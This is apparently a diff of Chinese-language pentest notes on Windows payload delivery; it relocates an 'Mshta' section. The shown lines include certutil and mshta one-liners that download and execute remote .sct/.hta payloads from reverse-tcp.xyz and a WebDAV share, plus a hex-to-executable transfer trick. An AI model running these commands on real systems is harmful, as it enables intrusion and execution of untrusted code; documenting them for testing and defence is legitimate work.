@@ -91,21 +91,6 @@ certutil -urlcache -split -f http://reverse-tcp.xyz/payload payload
 
 Windows debug 是一个系统自带的程序调试工具，他有一个功能可以将十六进制转化为可执行文件，所以我们的思路就是将需要上传的可执行文件转化成hex文件，通过echo命令写入目标系统中，最后通过debug将hex还原成可执行文件，这一部分具体步骤可参考我之前的一篇[文章](http://reverse-tcp.xyz/2017/05/27/Some-Ways-To-Create-An-Interactive-Shell-On-Windows/)
 
-#### Mshta
-
-Mshta实际上是一个与cscript/wscript相似，但是它具有执行内联脚本的能力，它将下载并执行一个脚本作为有效负载:
-
-```powershell
-mshta vbscript:Close(Execute("GetObject(""script:http://reverse-tcp.xyz/payload.sct"")"))
-```
-
-mshta接受URL作为一个参数来执行HTA
-
-```powershell
-mshta http://reverse-tcp.xyz/payload.hta
-mshta \\webdavserver\folder\payload.hta
-```
-
 #### FTP
 
 ftp也是一种比较经典的方法，核心就是通过ftp -s:filename.txt去执行filename里边的ftp命令
@@ -351,6 +336,21 @@ msiexec /q /i http://192.168.100.3/tmp/cmd.png
 Links:
 
 - https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/
+
+#### Mshta
+
+Msht具有执行内联脚本的能力，它将下载并执行一个脚本作为有效负载:
+
+```powershell
+mshta vbscript:Close(Execute("GetObject(""script:http://reverse-tcp.xyz/payload.sct"")"))
+```
+
+mshta接受URL作为一个参数来执行HTA
+
+```powershell
+mshta http://reverse-tcp.xyz/payload.hta
+mshta \\webdavserver\folder\payload.hta
+```
 
 #### FSI
 
